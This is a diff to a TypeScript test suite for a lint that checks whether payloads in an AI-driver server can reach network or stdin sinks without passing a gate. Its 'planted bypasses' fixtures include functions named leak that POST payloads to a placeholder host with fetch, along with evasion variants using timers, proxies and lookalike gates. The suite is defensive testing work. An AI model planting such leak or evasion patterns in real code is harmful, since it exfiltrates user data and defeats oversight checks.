@@ -38,7 +38,7 @@ interface Pin { file: string; fn: string; anchor: string; kind: string; n?: numb
 interface CallerPin { file: string; fn: string; anchor: string; callee: string; n?: number; reason: Reason; admittedBy?: string }
 /** `via` (optional, only on a hook hop): the names of the same-file helper functions that hold the write(s) `to` names. The lint proves each
  *  is called synchronously after the hook, inside the hook's function, and that its own path to the write is synchronous. */
-interface Hop { file: string; fn: string; from: string; to: string; payload: string[]; via?: string[] }
+interface Hop { file: string; fn: string; from: string; to: string; payload: string[]; via?: string[]; fromIndex?: number; fromCount?: number }
 interface Chain { name: string; admittedBy: string; hops: Hop[] }
 interface TimerPin { file: string; fn: string; anchor: string }
 interface Pins { sinks: Pin[]; callers: CallerPin[]; chains: Chain[]; timers: TimerPin[]; pinnedCallers: Array<{ file: string; name: string }> }
@@ -227,6 +227,13 @@ function scan(prog: ts.Program, pins: Pins): Scan {
     if (!(ts.isPropertyAccessExpression(node) && ts.isCallExpression(node.parent) && node.parent.expression === node && PROPERTY_SINKS.has(node.name.text))) return "";
     const name = node.name.text, recv = node.expression;
     let kind = sinkOfSymbol(resolve(node.name));
+    // A property typed as the global fetch keeps that call signature's declaration,
+    // even when its property symbol belongs to an injected client object.
+    if (!kind && name === "fetch" && checker.getTypeAtLocation(node).getCallSignatures().some(signature => {
+      const declaration = signature.getDeclaration();
+      return !!declaration && ts.isFunctionDeclaration(declaration) && declaration.name?.text === "fetch"
+        && fwd(declaration.getSourceFile().fileName).includes("/node_modules/");
+    })) kind = "fetch";
     if (!kind && (name === "write" || name === "end") && /stdin$/.test(squash(recv.getText()))) kind = "stdin";
     if (!kind && name === "write" && writableType(checker.getTypeAtLocation(recv))) kind = "stream-write";
     if (!kind && name === "sendTurn") kind = "sendTurn";
@@ -283,7 +290,7 @@ function scan(prog: ts.Program, pins: Pins): Scan {
   const hopFn = (hop: Hop): string => {
     if (hop.fn || !hop.from) return hop.fn;
     const sf = prog.getSourceFile(join(ROOT, hop.file));
-    const hit = sf ? callsIn(sf).find(c => anchorOf(c).startsWith(squash(hop.from))) : undefined;
+    const hit = sf ? callsIn(sf).filter(c => anchorOf(c).startsWith(squash(hop.from)))[hop.fromIndex ?? 0] : undefined;
     return hit ? fnName(hit) : "";
   };
   const onChain = (pin: { file: string; fn: string; anchor: string }, name: string): boolean => {
@@ -497,8 +504,8 @@ function lintHop(prog: ts.Program, hop: Hop, timers: TimerPin[]): string[] {
   const all = (node: ts.Node) => { if (ts.isCallExpression(node)) calls.push(node); ts.forEachChild(node, all); };
   all(sf);
   const froms = hop.from ? calls.filter(c => anchorOf(c).startsWith(squash(hop.from))) : [];
-  if (hop.from && froms.length !== 1) return [`${hop.file}: the hook anchor ${hop.from} matches ${froms.length} calls`];
-  const from = froms[0];
+  if (hop.from && froms.length !== (hop.fromCount ?? 1)) return [`${hop.file}: the hook anchor ${hop.from} matches ${froms.length} calls (expected ${hop.fromCount ?? 1})`];
+  const from = froms[hop.fromIndex ?? 0];
   const fn = from ? fnName(from) : hop.fn;
   if (hop.via?.length) return from ? lintViaHop(prog, sf, hop, from, fn, timers) : [`${hop.file}: a via hop needs its hook anchor`];
   const to = calls.find(c => fnName(c) === fn && anchorOf(c).startsWith(squash(hop.to)) && (!from || c.getStart() > from.getEnd()));
@@ -646,7 +653,26 @@ function diff(found: Scan, pins: Pins): string[] {
   }
   return out;
 }
-function lintChains(prog: ts.Program, pins: Pins): string[] { return pins.chains.flatMap(chain => chain.hops.flatMap(hop => lintHop(prog, hop, pins.timers).map(p => `${chain.name}: ${p}`))); }
+function lintChains(prog: ts.Program, pins: Pins): string[] {
+  return pins.chains.flatMap(chain => {
+    // Repeated hooks need an exact count and one hop for every occurrence. A new,
+    // deleted or duplicated hook cannot silently select another submission path.
+    const groups = new Map<string, Hop[]>();
+    for (const hop of chain.hops) if (hop.from) {
+      const key = `${hop.file}|${squash(hop.from)}`;
+      groups.set(key, [...(groups.get(key) ?? []), hop]);
+    }
+    const coverage: string[] = [];
+    for (const [key, hops] of groups) {
+      const count = hops[0].fromCount ?? 1;
+      const indices = hops.map(h => h.fromIndex ?? 0).sort((a, b) => a - b);
+      if (!Number.isInteger(count) || count < 1 || hops.length !== count
+        || hops.some(h => (h.fromCount ?? 1) !== count)
+        || indices.some((index, i) => index !== i)) coverage.push(`${chain.name}: incomplete hook coverage for ${key}`);
+    }
+    return [...coverage, ...chain.hops.flatMap(hop => lintHop(prog, hop, pins.timers).map(p => `${chain.name}: ${p}`))];
+  });
+}
 
 let base: ts.Program, pins: Pins, found: Scan;
 const read = (file: string) => readFileSync(join(ROOT, file), "utf8");
@@ -676,6 +702,27 @@ describe("the learning send boundary (section 4)", () => {
   it("every hook-to-write chain is synchronous for its payload", () => {
     expect(lintChains(base, pins)).toEqual([]);
   });
+  it("checks every explicitly indexed repeated submission hook and rejects incomplete coverage", () => {
+    const file = "server/memory/__indexed_hooks__.ts";
+    const text = `declare function send(payload: string): void;
+export function first(payload: string, beforeSubmit: () => void) { beforeSubmit(); send(payload); }
+export function second(payload: string, beforeSubmit: () => void) { beforeSubmit(); send(payload); }
+`;
+    const hops = [0, 1].map(fromIndex => ({ file, fn: "", from: "beforeSubmit()", to: "send(payload)", payload: ["payload"], fromIndex, fromCount: 2 }));
+    const inventory = { ...pins, chains: [{ name: "indexed", admittedBy: "fixture", hops }] };
+    const prog = program({ [file]: text }, base);
+    expect(lintChains(prog, inventory)).toEqual([]);
+    for (const fn of ["first", "second"]) {
+      const changed = text.replace(`function ${fn}(payload: string, beforeSubmit: () => void) { beforeSubmit();`, `async function ${fn}(payload: string, beforeSubmit: () => void) { beforeSubmit(); await Promise.resolve();`);
+      expect(changed).not.toBe(text);
+      expect(lintChains(program({ [file]: changed }, base), inventory).join("\n")).toMatch(/await on the hook chain/);
+    }
+    expect(lintChains(prog, { ...inventory, chains: [{ ...inventory.chains[0], hops: hops.slice(0, 1) }] }).join("\n")).toMatch(/hook coverage/);
+    expect(lintChains(prog, { ...inventory, chains: [{ ...inventory.chains[0], hops: [hops[0], hops[0]] }] }).join("\n")).toMatch(/hook coverage/);
+    const extra = text + "export function third(payload: string, beforeSubmit: () => void) { beforeSubmit(); send(payload); }\n";
+    expect(lintChains(program({ [file]: extra }, base), inventory).join("\n")).toMatch(/matches 3 calls/);
+  }, 600_000);
+
   it("HTTP learning transports have no exemption: their fetch is inside the gate's send", () => {
     expect(pins.sinks.filter(e => (e.kind === "fetch" || e.kind === "alias-call") && (e.file === "server/drivers/http-text-only.ts" || e.file === "server/memory/extract.ts"))).toEqual([]);
   });
@@ -683,6 +730,12 @@ describe("the learning send boundary (section 4)", () => {
   describe("T15a: planted bypasses fail the scan", () => {
     const NEW = "server/memory/__planted__.ts";
     it("a raw fetch in a new file", () => { expect(planted({ [NEW]: `export const leak = (p: string) => fetch("https://x.invalid", { method: "POST", body: p });\n` }).join("\n")).toMatch(/unpinned sink: server\/memory\/__planted__\.ts\|leak\|fetch/); }, 600_000);
+    it("a typed fetch property is a content sink", () => {
+      const out = planted({ [NEW]: `declare const client: { fetch: typeof fetch };
+export const leak = (payload: string) => client.fetch("https://x.invalid", { method: "POST", body: payload });
+` }).join("\n");
+      expect(out).toMatch(/unpinned sink: .*__planted__.*\|fetch\|client.fetch/);
+    }, 600_000);
     it("an aliased fetch", () => { expect(planted({ [NEW]: `const f = fetch;\nexport const leak = (p: string) => f("https://x.invalid", { body: p });\n` }).join("\n")).toMatch(/unpinned sink: .*__planted__.*\|(fetch|alias-call)\|/); }, 600_000);
     it("a Writable.write in a new helper", () => { expect(planted({ [NEW]: `import type { Writable } from "node:stream";\nexport const leak = (w: Writable, p: string) => w.write(p);\n` }).join("\n")).toMatch(/unpinned sink: .*__planted__.*stream-write/); }, 600_000);
     it("a deferred payload write", () => { expect(planted({ [NEW]: `import type { Writable } from "node:stream";\nexport const leak = (w: Writable, p: string) => queueMicrotask(() => w.write(p));\n` }).join("\n")).toMatch(/unpinned sink: .*__planted__.*stream-write/); }, 600_000);
@@ -699,8 +752,8 @@ describe("the learning send boundary (section 4)", () => {
       expect(planted({ [file]: awaited }).join("\n")).toMatch(/muse: .*await on the hook chain/);
       const moved = text.replace("p.beforeSubmit?.();", "(() => { p.beforeSubmit?.(); })();");
       expect(planted({ [file]: moved }).join("\n")).toMatch(/muse: .*outside the hook's function/);
-      const prompt = 'submit();\n              child.stdin.write(bytes, "utf8", onWritten);';
-      const deferred = text.replace(prompt, 'submit();\n              setTimeout(() => child.stdin.write(bytes, "utf8", onWritten), 0);');
+      const prompt = 'child.stdin.write(bytes, "utf8", onWritten)';
+      const deferred = text.replace(prompt, 'setTimeout(() => child.stdin.write(bytes, "utf8", onWritten), 0)');
       expect(deferred).not.toBe(text);
       expect(planted({ [file]: deferred }).join("\n")).toMatch(/muse: .*deferred function/);
     }, 600_000);
@@ -715,7 +768,7 @@ describe("the learning send boundary (section 4)", () => {
       }, 600_000);
       it("rejects a deferred muse write inside the launch callback", () => {
         const file = "server/drivers/muse-code.ts", text = read(file);
-        const bad = text.replace("gate.launch(prompt.entry, () => {\n              submit();\n              child.stdin.write(bytes, \"utf8\", onWritten);", "gate.launch(prompt.entry, () => {\n              submit();\n              void Promise.resolve().then(() => child.stdin.write(bytes, \"utf8\", onWritten));");
+        const bad = text.replace('child.stdin.write(bytes, "utf8", onWritten)', 'void Promise.resolve().then(() => child.stdin.write(bytes, "utf8", onWritten))');
         expect(bad).not.toBe(text);
         expect(planted({ [file]: bad }).join("\n")).toMatch(/muse: .*deferred function/);
       }, 600_000);
@@ -727,13 +780,13 @@ describe("the learning send boundary (section 4)", () => {
       }, 600_000);
       it("rejects a genuinely async codex launch callback", () => {
         const file = "server/drivers/codex.ts", text = read(file);
-        const bad = text.replace("gate.launch(entry, () => request(method, commandParams ?? {", "gate.launch(entry, async () => request(method, commandParams ?? {");
+        const bad = text.replace("gate.launch(entry, () => request(method, registerBusyloopRequestSite(fluxRouteFor(requestUrl), commandParams ?? {", "gate.launch(entry, async () => request(method, registerBusyloopRequestSite(fluxRouteFor(requestUrl), commandParams ?? {");
         expect(bad).not.toBe(text);
         expect(planted({ [file]: bad }).join("\n")).toMatch(/codex: .*deferred function/);
       }, 600_000);
       it("rejects a look-alike that has all five of the stop gate's names but is not declared in stop-gate.ts", () => {
         const file = "server/drivers/codex.ts", text = read(file);
-        const bad = text.replace("gate.launch(entry, () => request(method, commandParams ?? {", "lookalike.launch(entry, () => request(method, commandParams ?? {")
+        const bad = text.replace("gate.launch(entry, () => request(method, registerBusyloopRequestSite(fluxRouteFor(requestUrl), commandParams ?? {", "lookalike.launch(entry, () => request(method, registerBusyloopRequestSite(fluxRouteFor(requestUrl), commandParams ?? {")
           + "\nconst lookalike = { launch: (_entry: unknown, f: () => unknown) => setTimeout(f, 0), step: undefined, cleanupStep: undefined, handoff: undefined, bindLive: undefined };\n";
         expect(bad).not.toBe(text);
         expect(planted({ [file]: bad }).join("\n")).toMatch(/codex: .*deferred function/);
@@ -763,7 +816,7 @@ describe("the learning send boundary (section 4)", () => {
       }, 600_000);
       it("rejects a union receiver when any member is not the stop gate", () => {
         const file = "server/drivers/codex.ts", text = read(file);
-        const bad = text.replace("gate.launch(entry, () => request(method, commandParams ?? {", "pick.launch(entry, () => request(method, commandParams ?? {")
+        const bad = text.replace("gate.launch(entry, () => request(method, registerBusyloopRequestSite(fluxRouteFor(requestUrl), commandParams ?? {", "pick.launch(entry, () => request(method, registerBusyloopRequestSite(fluxRouteFor(requestUrl), commandParams ?? {")
           + "\ndeclare const real: import(\"./stop-gate.ts\").StopGate;\nconst lookalike = { launch: (_entry: unknown, f: () => unknown) => Promise.resolve().then(f), step: undefined, cleanupStep: undefined, handoff: undefined, bindLive: undefined };\nconst pick = Math.random() > 2 ? real : lookalike;\n";
         expect(bad).not.toBe(text);
         expect(planted({ [file]: bad }).join("\n")).toMatch(/codex: .*deferred function/);
@@ -779,8 +832,14 @@ describe("the learning send boundary (section 4)", () => {
         expect(planted({ [MUSE]: bad }).join("\n")).toMatch(/muse: .*helper writePrompt is a generator/);
       }, 600_000);
       it("rejects a write moved into an accessor the helper hands to a then", () => {
-        const text = read(MUSE), original = "const writeControl = (bytes: ControlFrame) => {\n          submit();\n          child.stdin.write(bytes, \"utf8\", onWritten);\n        };";
-        const bad = text.replace(original, "const writeControl = (bytes: ControlFrame) => {\n          submit();\n          const lazy = { get value() { return child.stdin.write(bytes, \"utf8\", onWritten); } };\n          void Promise.resolve().then(() => lazy.value);\n        };");
+        // busyloop-r2.md:17-20 keeps the typed request marker around the actual write.
+        const text = read(MUSE);
+        const original = /const writeControl = \(bytes: ControlFrame\) => \{\n          submit\(\);\n          (registerBusyloopRequestSite\([^\n]+\);)\n        \};/;
+        const bad = text.replace(original, (_match, write: string) => `const writeControl = (bytes: ControlFrame) => {
+          submit();
+          const lazy = { get value() { return ${write} } };
+          void Promise.resolve().then(() => lazy.value);
+        };`);
         expect(bad).not.toBe(text);
         expect(planted({ [MUSE]: bad }).join("\n")).toMatch(/muse: .*deferred function/);
       }, 600_000);
@@ -795,7 +854,7 @@ describe("the learning send boundary (section 4)", () => {
       }, 600_000);
       it("rejects replacing, proxying or defining over a real stop gate's launch, and an untyped value passed as the gate", () => {
         const file = "server/drivers/codex.ts", text = read(file);
-        const call = "await gate.step(entry, gate.launch(entry, () => request(method, commandParams ?? {";
+        const call = "await gate.step(entry, gate.launch(entry, () => request(method, registerBusyloopRequestSite(fluxRouteFor(requestUrl), commandParams ?? {";
         const replaced = text.replace(call, `gate.launch = new Proxy(gate.launch, { apply: (target, self, args) => Promise.resolve().then(() => Reflect.apply(target, self, args)) });\n        ${call}`);
         expect(replaced).not.toBe(text);
         expect(planted({ [file]: replaced }).join("\n")).toMatch(/a write to a stop gate member at server\/drivers\/codex\.ts/);
@@ -823,7 +882,8 @@ describe("the learning send boundary (section 4)", () => {
     });
     it("a new unpinned timer on the ACP prompt path", () => {
       const file = "server/drivers/acp/core.ts", text = read(file);
-      const bad = text.replace("send({ jsonrpc: \"2.0\", id, method, params });", "setImmediate(() => undefined); send({ jsonrpc: \"2.0\", id, method, params });");
+      const site = 'registerBusyloopRequestSite(fluxRouteFor(requestUrl), send({ jsonrpc: "2.0", id, method, params }));';
+      const bad = text.replace(site, `setImmediate(() => undefined); ${site}`);
       expect(bad).not.toBe(text);
       expect(planted({ [file]: bad }).join("\n")).toMatch(/unpinned timer/);
     }, 600_000);
@@ -870,13 +930,13 @@ describe("the learning send boundary (section 4)", () => {
     }, 600_000);
     it("an unchanged-anchor gate payload at a pinned not-learning ACP send( caller and at the interjection (H5)", () => {
       const file = "server/drivers/acp/core.ts", text = read(file);
-      const sendSite = `send({ jsonrpc: "2.0", id: msg.id, result });`;
+      const sendSite = `return deliverNative(slot, source === 'user' ? 'answer' : 'retire', JSON.stringify({behavior,result}),`;
       const bad = text.replace(sendSite, `result = turn.text; ${sendSite}`);
       expect(bad).not.toBe(text);
       const out = planted({ [file]: bad }).join("\n");
       expect(out).toMatch(/a gate payload reaches the not-learning send\( caller at server\/drivers\/acp\/core\.ts/);
       expect(out).not.toMatch(/vanished or moved caller pin/);
-      const steer = `const response = request(support.interjection!.method, { sessionId, text, interjectionId }, ackMs)`;
+      const steer = `const response = NotModelRequest("ACP initialization, session configuration, cancellation, filesystem or permission response; no session/prompt is submitted", request(support.interjection!.method, { sessionId, text, interjectionId }, ackMs))`;
       const bad2 = text.replace(steer, `text = turn.text; ${steer}`);
       expect(bad2).not.toBe(text);
       expect(planted({ [file]: bad2 }).join("\n")).toMatch(/a gate payload reaches the not-learning request\( caller/);
@@ -886,6 +946,15 @@ describe("the learning send boundary (section 4)", () => {
       const bad = text.replace("try { gate.admit(); }", "try { gate.check(); }");
       expect(bad).not.toBe(text);
       expect(planted({ [file]: bad }).join("\n")).toMatch(/learning-path sink pin not proven \(fence:beforeSubmit\)/);
+    }, 600_000);
+    it("a learning payload cannot enter the permission-send wrapper under an unchanged pin", () => {
+      const file = "server/drivers/acp/core.ts", text = read(file);
+      const site = `NotModelRequest("ACP initialization, session configuration, cancellation, filesystem or permission response; no session/prompt is submitted", sendPermission(response, (error, accepted = true) => {`;
+      const bad = text.replace(site, `response = turn.text; ${site}`);
+      expect(bad).not.toBe(text);
+      const out = planted({ [file]: bad }).join("\n");
+      expect(out).toMatch(/a gate payload reaches the not-learning sendPermission\( caller at server\/drivers\/acp\/core\.ts/);
+      expect(out).not.toMatch(/vanished or moved caller pin/);
     }, 600_000);
     it("the hidden learning sendTurn without its beforeSubmit (H4, GrokBuild r1)", () => {
       const file = "server/drivers/cli-memory-learning.ts", text = read(file);
